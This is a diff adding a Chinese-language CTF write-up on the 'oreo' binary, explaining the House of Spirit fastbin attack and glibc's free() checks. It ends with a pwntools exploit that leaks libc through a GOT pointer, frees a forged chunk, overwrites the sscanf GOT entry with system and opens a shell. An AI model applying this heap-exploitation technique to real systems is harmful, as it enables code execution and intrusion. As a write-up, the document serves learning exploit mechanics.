@@ -1,6 +1,252 @@
 ---
-layout: heap
 title: oreo
 date: 2019-03-08 09:48:23
-tags:
+tags: [fastbin attack,House of spirit]
 ---
+
+### House of spirit
+House of spirit是文章“The Mallo Maleficarum”提出的一种利用fastbin实施堆攻击的内存漏洞利用技术，其思想就是构造一个fake chunk使得内存分配器错误的分配到我们可控的内存区域，进而达到任意地址读写的的效果。该攻击适合用户控制了低地址(chunk头)、高地址(next chunk头)，需要通过House of spirit来控制中间地址的情景
+
+House of sirit的利用思路如下：
+1. 程序存在漏洞可以控制一个free函数的参数——指针P
+2. 可在可控内存区域(.bss,stack,heap)上构造一个fake fastchunk
+3. 将指针P修改为fack fastchunk的chunk address，将其free到FastbinY[i]单链表中
+4. 再次申请同样大小的chunk，会返回fake fastchunk，结合程序的功能实现任意地址读写的效果
+
+关键就是如何正确伪造一个fake fastchunk，来绕过glic的安全检测
+
+
+### glibc中关于释放fast chunk的安全检测
+堆的释放函数定义在_libc_free函数中，通过源码分析，正常释放一个fastchunk时有五个安全检测
+
+1. 在_libc_free函数中，会检测该chunk是否通过mmap申请，即检测chunk的ISMMAP标志位，即 A|M|P 中的第二位，如果`ISMMAP`为1的话，就说明该chunk是通过`mmap`申请的空间，就会调用munmap函数进行释放,同时对mmap分配mmap_threshold及收缩trim_threshold阈值进行调整。所以我们要将它置0。
+```C
+if (chunk_is_mmapped (p))                       /* release mmapped memory. */
+  {
+    /* See if the dynamic brk/mmap threshold needs adjusting.
+       Dumped fake mmapped chunks do not affect the threshold.  */
+    if (!mp_.no_dyn_threshold
+        && chunksize_nomask (p) > mp_.mmap_threshold
+        && chunksize_nomask (p) <= DEFAULT_MMAP_THRESHOLD_MAX
+        && !DUMPED_MAIN_ARENA_CHUNK (p))
+      {
+        mp_.mmap_threshold = chunksize (p);
+        mp_.trim_threshold = 2 * mp_.mmap_threshold;
+        LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2,
+                    mp_.mmap_threshold, mp_.trim_threshold);
+      }
+    munmap_chunk (p);
+    return;
+  }
+```
+
+> 下面是_libc_free函数中子函数`_int_free`的安全检查
+
+2. chunk指针的地址要对齐且堆指针不能溢出
+```C
+if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0)
+    || __builtin_expect (misaligned_chunk (p), 0))
+  malloc_printerr ("free(): invalid pointer");
+```
+3. chunk的大小要大于MINSIZE且大小对齐()
+```C
+if (__glibc_unlikely (size < MINSIZE || !aligned_OK (size)))
+    malloc_printerr ("free(): invalid size");
+```
+4. chunk的size要小于fastchunk支持的最大值
+```C
+if ((unsigned long)(size) <= (unsigned long)(get_max_fast ())
+```
+5. next chunk的size要大于2*SIZE_SZ(x86下SIZE_SZ为4，x64下为8)，且小于av_>system_mem(默认为128kb)
+```C
+if (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))
+                          <= 2 * SIZE_SZ, 0)
+        || __builtin_expect (chunksize (chunk_at_offset (p, size))
+                             >= av->system_mem, 0))
+```
+### oreo程序分析
+程序的功能如下：
+```C
+Welcome to the OREO Original Rifle Ecommerce Online System!
+
+     ,______________________________________
+    |_________________,----------._ [____]  -,__  __....-----=====
+                   (_(||||||||||||)___________/                   |
+                      `----------'   OREO [ ))"-,                   |
+                                           ""    `,  _,--....___    |
+                                                   `/           """"
+
+What would you like to do?
+
+1. Add new rifle
+2. Show added rifles
+3. Order selected rifles
+4. Leave a Message with your Order
+5. Show current stats
+6. Exit!
+Action:
+```
+#### 1. Add new rifle
+存储枪支信息的结构体占用0x38个字节，`*((_DWORD *)dword_804A288 + 13) = v1;`是将dword_804A288+52(4x13)处记录上一个chunk的地址last_chunk,所以0x804A288存储的一直是最新申请的chunk返回的指针。且0x804A2A4中的数据自增1，可以猜测这个地址存储了订单个数。
+
+所以存储枪支信息大概的结构体是：
+```c
+struct rifle {
+    char descript[25]
+    char name[27]
+    char *last_chunk
+}
+```
+其中fget存在溢出漏洞，可以覆盖name后的*last_chunk指针，这样就获得一个可控的指针。
+```C
+v1 = dword_804A288;
+  dword_804A288 = (char *)malloc(0x38u);
+  if ( dword_804A288 )
+  {
+    *((_DWORD *)dword_804A288 + 13) = v1;
+    printf("Rifle name: ");
+    fgets(dword_804A288 + 25, 56, stdin);
+    sub_80485EC(dword_804A288 + 25);
+    printf("Rifle description: ");
+    fgets(dword_804A288, 56, stdin);
+    sub_80485EC(dword_804A288);
+    ++dword_804A2A4;
+  }
+```
+##### 2. Show added rifles
+打印出枪支信息，如果在上一步中，将*last_chunk覆盖为put@got地址，那么show的时候就会打印出程序加载libc后put的地址。
+```C
+printf("Rifle to be ordered:\n%s\n", "===================================");
+for ( i = dword_804A288; i; i = (char *)*((_DWORD *)i + 13) )
+{
+  printf("Name: %s\n", i + 25);
+  printf("Description: %s\n", i);
+  puts("===================================");
+}
+```
+
+#### 3. Order selected rifles
+释放所有通过add rifle申请的chunk，从0x804A288开始通过*last_chunk指针，释放依次链接的chunk
+```C
+v2 = dword_804A288;
+if ( dword_804A2A4 )
+{
+  while ( v2 )
+  {
+    ptr = v2;
+    v2 = (char *)*((_DWORD *)v2 + 13);
+    free(ptr);
+  }
+  dword_804A288 = 0;
+  ++dword_804A2A0;
+  puts("Okay order submitted!");
+}
+```
+#### 4. Leave a Message with your Order
+向0x804A2A8指向的地址吸入数据
+`fgets(dword_804A2A8, 128, stdin);`
+
+### 利用分析
+1. 由程序功能Add new rifle中的fgets函数的溢出漏洞，可以得到一个可控的指针，结合程序的Show added rifles功能，可以获得libc中函数的地址，进而可以计算出属system的地址。
+2. 因为free()参数可控，所以可以利用House of spirit攻击，在目标位置伪造一个chunk，释放后再申请，结合程序的功能，实现在目标位置的写操作。
+3. 结合对程序的分析，申请一个chunk，将*last_chunk指针覆盖为0x804A2A8，即引导程序释放fake chunk，结合上面对fast chunk释放的检测，构造fakechunk如下
+```
++------------+
+| 0xdeadbeef |  # prev_size位，该chunk在使用时，内容可以不用管
++------------+
+|    0x41    |  # 伪造的chunk size要对齐0x41或者0x40都可以
++------------+<-fake_addr(ptr)
+| 0x0804a2c0 |  # 0x804A2A8
++------------+   
+|    0x0     |
++------------+
+|     ...    |
++------------+
+|    0x61    |  # 0x0804a2c0 'a'*0x20
++------------+
+|    0x61    |
++------------+
+|     ...    |
++------------+
+|    0x00    |  # 0x0804a2dc
++------------+
+| 0xdeadbeef |  # prev_size位,当该chunk free时，为上一个free chunk大小
++------------+
+|    0x40    |  # next chunk的SIZE
++------------+
+```
+下面是释放过程：
+因为0x804A288存储的一直是最新申请的chunk返回的指针，所程序首先释放该地址指向的chunk，这个chunk是正常申请的，所以SIZE可以通过检测，其中会检测下一个chunk的SIZE，因为下一个chunk的top chunk，也可以通过检测。
+
+接着释放*last_chunk指向的fakechunk 0x804A2A8，fake chunk的SIZE通过申请0x3f次的chunk，来使其内容最后为0x41，这样就可以过SIZE检测，之后检测next chunk的SIZE，其大小可以为8到128kb之间的任意的值。
+
+释放成功后，再次申请，并写入__isoc99_sscanf_got，__isoc99_sscanf_got的地址就被写在0x804A2A8处，调用程序Leave a Message with your Order功能，就可以将之前获得的system的地址写入0x804A2A8指向的地址内，即调用__isoc99_sscanf即调用system，结束功能时，程序会接受指令，调用的就是__isoc99_sscanf，此时传入'/bin/sh;'即可获得shell
+
+### EXP
+```python
+#!/use/bin/env python
+from pwn import *
+import time
+p = process('./oreo')
+elf = ELF('./oreo')
+libc = ELF('./libc')
+VERBOSE = 1
+DEBUG = 0
+
+if VERBOSE:
+	context.log_level = 'debug'
+if DEBUG:
+	gdb.attach(p)
+
+def add(description,name):
+	p.sendline('1')
+	p.sendline(name)
+	p.sendline(description)
+
+def show():
+	p.sendline('2')
+	p.recvuntil('===================================\n')
+
+def order():
+	p.sendline('3')
+
+def message(msg):
+	p.sendline('4')
+	p.sendline(msg)
+
+def pwn():
+	print 'step 1. use heap overflow to leak the addr of system and /bin/sh'
+	puts_got = elf.got['puts']
+	name = 'n'*27 + p32(puts_got)
+	add('d'*25,name)
+	show()
+	p.recvuntil('Description: ')
+	p.recvuntil('Description: ')
+	puts_addr = u32(p.recv(4))
+	log.success('puts_addr: '+hex(puts_addr))
+	libc_base = puts_addr - libc.symbols['puts']
+	system_addr = libc_base + libc.symbols['system']
+	log.success('system_addr: '+hex(system_addr))
+
+	print 'create a fack chunk at 0x804a2a8'
+	for i in range(0,0x3f):  #make the content of 0x804a2a8 is 39
+		add('d'*25,'n'*27)
+	name = 'n'*27 + p32(0x804a2a8)
+	add('d'*25,name)
+	#payload = '\x00'*0x20 + p32(0x40)+p32(0x40)
+	payload = 'a'*(0x20-0x4)+p32(0)+p32(0x40)
+	message(payload)
+	order()
+
+
+	print 'step 3. get shell'
+	__isoc99_sscanf_got = p32(elf.got['__isoc99_sscanf'])
+	add(__isoc99_sscanf_got,'deadbeef')
+	log.success('__isoc99_sscanf:'+hex(elf.got['__isoc99_sscanf']))
+	message(p32(system_addr))
+	p.sendline('/bin/sh;')
+	p.interactive()
+
+if __name__ == '__mian__':
+  pwn()
+```
